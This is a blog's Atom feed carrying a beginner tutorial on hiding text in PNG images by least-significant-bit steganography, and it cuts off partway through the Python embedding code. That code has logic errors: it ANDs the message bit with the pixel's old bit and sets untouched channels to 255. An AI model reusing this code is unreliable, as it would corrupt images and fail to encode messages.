<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-13T19:19:54+02:00</updated><id>http://localhost:4000/</id><title type="html">Computer Security for Beginners</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">Steganography Tutorial: Least Significant Bit (LSB)</title><link href="http://localhost:4000/stegano/2018/08/12/Steganography-Least-Significant-Bit.html" rel="alternate" type="text/html" title="Steganography Tutorial: Least Significant Bit (LSB)" /><published>2018-08-12T18:00:00+02:00</published><updated>2018-08-12T18:00:00+02:00</updated><id>http://localhost:4000/stegano/2018/08/12/Steganography-Least-Significant-Bit</id><content type="html" xml:base="http://localhost:4000/stegano/2018/08/12/Steganography-Least-Significant-Bit.html">&lt;p&gt;This article details a common steganography method known as the Least Significant Bit. This technique is very efficient because of its &lt;strong&gt;simplicity&lt;/strong&gt; and its ability to be &lt;strong&gt;undetectable to the naked eye&lt;/strong&gt;. After reading this, you’ll be able to hide a message inside a picture using this technique, but also to detect any dissimulated message.&lt;/p&gt;

&lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#do-it-yourself&quot; id=&quot;markdown-toc-do-it-yourself&quot;&gt;Do It Yourself!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#technical-description&quot; id=&quot;markdown-toc-technical-description&quot;&gt;Technical description&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#digital-image-structure&quot; id=&quot;markdown-toc-digital-image-structure&quot;&gt;Digital image structure&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#lsb-principle&quot; id=&quot;markdown-toc-lsb-principle&quot;&gt;LSB Principle&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#am-i-not-significant-to-you&quot; id=&quot;markdown-toc-am-i-not-significant-to-you&quot;&gt;Am I not significant to you?&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#why-do-we-modify-this-very-specific-bit&quot; id=&quot;markdown-toc-why-do-we-modify-this-very-specific-bit&quot;&gt;Why do we modify this very specific bit?&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#how-to-hide-a-message&quot; id=&quot;markdown-toc-how-to-hide-a-message&quot;&gt;How to hide a message?&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#encoding-and-transforming-a-string-into-a-sequence-of-bits&quot; id=&quot;markdown-toc-encoding-and-transforming-a-string-into-a-sequence-of-bits&quot;&gt;Encoding and transforming a string into a sequence of bits&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#messing-with-pixels&quot; id=&quot;markdown-toc-messing-with-pixels&quot;&gt;Messing with pixels&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#detection&quot; id=&quot;markdown-toc-detection&quot;&gt;Detection&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#all-about-contrast&quot; id=&quot;markdown-toc-all-about-contrast&quot;&gt;All about contrast&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#extraction&quot; id=&quot;markdown-toc-extraction&quot;&gt;Extraction&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#python-my-love&quot; id=&quot;markdown-toc-python-my-love&quot;&gt;Python my love&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#your-turn&quot; id=&quot;markdown-toc-your-turn&quot;&gt;Your Turn!&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#resources&quot; id=&quot;markdown-toc-resources&quot;&gt;Resources&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;do-it-yourself&quot;&gt;Do It Yourself!&lt;/h2&gt;

&lt;p&gt;If you’re already familiar with the concept of LSB and simply want to practice, download &lt;a href=&quot;http://localhost:4000/assets/2018-08-12/lsb_spongebob.png&quot;&gt;this picture&lt;/a&gt; and feel free to send me your result or to post it in the comment section.&lt;/p&gt;

&lt;h2 id=&quot;technical-description&quot;&gt;Technical description&lt;/h2&gt;

&lt;h3 id=&quot;digital-image-structure&quot;&gt;Digital image structure&lt;/h3&gt;

&lt;p&gt;To understand this technique, a few reminders of some digital imaging basics might be useful.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A digital image is composed of \(X\) rows by \(Y\) columns.&lt;/li&gt;
  &lt;li&gt;The point of coordinates \([a,b]\) with \(0\leqslant a&amp;lt;X\) and \(0\leqslant b&amp;lt;Y\), is called a &lt;strong&gt;pixel&lt;/strong&gt;. The &lt;strong&gt;pixel&lt;/strong&gt; represents the smallest addressable element of a picture.&lt;/li&gt;
  &lt;li&gt;Each pixel is associated with a color, usually decomposed in three primary colors: &lt;strong&gt;Red, Green, Blue&lt;/strong&gt;. A pixel can then be specified as &lt;strong&gt;pixel(Red, Green, Blue)&lt;/strong&gt;, that’s what we call the &lt;em&gt;RGB model&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Red, Green and Blue intensities can vary from 0 to 255.&lt;/li&gt;
  &lt;li&gt;WHITE = (255,255,255) and BLACK = (0,0,0).&lt;/li&gt;
  &lt;li&gt;A pixel take 3 bytes of memory, 1 for each primary component (hence the maximum value of 255).&lt;/li&gt;
  &lt;li&gt;A byte consists of 8 bits, representing a binary number (example: 1010 0101).&lt;/li&gt;
  &lt;li&gt;The highest value a byte can take is 1111 1111, which is equal to 255 in decimal.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;lsb-principle&quot;&gt;LSB Principle&lt;/h3&gt;

&lt;p&gt;Now that you have the structure of a digital image in mind, we can start talking about the serious stuff :wink:.&lt;/p&gt;

&lt;p&gt;As its name suggests, the Least Significant Bit technique is based on hiding information in the least significant bit of each byte of the picture. There are multiple variants of LSB but, in this article, we will set the focus on the most common one.&lt;/p&gt;

&lt;h4 id=&quot;am-i-not-significant-to-you&quot;&gt;Am I not significant to you?&lt;/h4&gt;

&lt;p&gt;The notion of “Least Significant Bit” probably doesn’t speak to everyone so I’ll explain it.
Let’s take the following representation of a byte, where the weight is annotated below each bit:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/byte_diagram.jpg&quot; alt=&quot;Bit weights&quot; title=&quot;Bit weights diagram&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first bit on the left is the “heaviest” one since it’s the one that has the biggest influence on the value of the byte. Its weight is 128.&lt;/p&gt;

&lt;p&gt;Now look at the bit on the very right. Its weight is 1 and it has a very minor impact on the value of the byte.
In a way, this bit is the &lt;strong&gt;least significant bit&lt;/strong&gt; of this byte.&lt;/p&gt;

&lt;h4 id=&quot;why-do-we-modify-this-very-specific-bit&quot;&gt;Why do we modify this very specific bit?&lt;/h4&gt;

&lt;p&gt;Well, simply because it’s the least significant one. Let me explain:&lt;/p&gt;

&lt;p&gt;The following diagram illustrates the color difference when the least significant bit of the red channel is modified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/significant_bit_diff.jpg&quot; alt=&quot;Significant bit modification&quot; title=&quot;Significant bit modification&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Can you spot the difference? No? Me neither and that’s exactly the goal! That way, we can modify &lt;strong&gt;3 bits per pixel&lt;/strong&gt; without it is noticeable.&lt;/p&gt;

&lt;h3 id=&quot;how-to-hide-a-message&quot;&gt;How to hide a message?&lt;/h3&gt;

&lt;p&gt;Ok the theory should be clear now, but we’ve seen that we can only hide 3 bits per pixel and we want to dissimulate a full message! How are we supposed to do?&lt;/p&gt;

&lt;p&gt;Easy! A message is actually a sequence of bits so it’s not an issue. The only limitation is that the size of the message in bits must be inferior to the number of pixels in the picture multiplied by 3.&lt;/p&gt;

&lt;p&gt;There are plenty of tools already available for hiding a message inside a picture with the LSB technique but &lt;strong&gt;I encourage you to write your own tool&lt;/strong&gt;. This will help you getting familiar with a scripting language and will require from you a prefect understanding of the concept.&lt;/p&gt;

&lt;p&gt;For the needs, of this tutorial I used Python 2.7. Sources of the scripts used in this article will be downloadable at the bottom of the page.&lt;/p&gt;

&lt;p&gt;Alright, let’s dive into the code! :+1:&lt;/p&gt;

&lt;h4 id=&quot;encoding-and-transforming-a-string-into-a-sequence-of-bits&quot;&gt;Encoding and transforming a string into a sequence of bits&lt;/h4&gt;

&lt;p&gt;In order to avoid data losses caused by encoding problems, &lt;strong&gt;the initial message must be base64-encoded&lt;/strong&gt;.
There are many ways to turn a string into its binary representation in python, but I decided to use the &lt;a href=&quot;https://pypi.org/project/bitarray/&quot;&gt;bitarray module&lt;/a&gt;. If you don’t have it installed, just type &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo pip install bitarray&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;bitarray&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'YourVerySecretText'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;encoded_message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#Converts the message into an array of bits&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ba&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitarray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bitarray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frombytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;bit_array&lt;/strong&gt; now contains the binary representation of our message.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;NOTE: Make sure to hide your message inside a PNG file and not a JPEG or its lossy compression algorithm will overwrite your modifications!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;messing-with-pixels&quot;&gt;Messing with pixels&lt;/h4&gt;

&lt;p&gt;Let’s say we want to hide our message inside this picture (download with &lt;strong&gt;Right click &amp;gt; Save Image as…&lt;/strong&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/spongebob.png&quot; alt=&quot;Confused Spongebob&quot; title=&quot;Confused Spongebob&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s a wonderful python library for manipulating images called &lt;a href=&quot;https://pillow.readthedocs.io/en/5.2.x/&quot;&gt;PIL&lt;/a&gt; (pillow since python3).&lt;/p&gt;

&lt;p&gt;First, let’s duplicate the original picture. We will only modify the one called “lsb_spongebob.png”.
Then, we store the image size for later.
The &lt;strong&gt;load()&lt;/strong&gt; function retrieves an array containing every pixel in RGB format.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lsb_spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lsb_spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s say we want to hide our message at the beginning of the &lt;strong&gt;first row of the picture&lt;/strong&gt;, I’ve written the following piece of code which is kinda ulgy, I agree, but that makes the job, you know :wink:.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Pixel : [&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d]&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Before : (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#Default values in case no bit has to be modified&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#Red pixel&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r_new_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r_new_last_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#Green pixel&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;g_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;g_new_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_new_last_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#Blue pixel&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;b_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
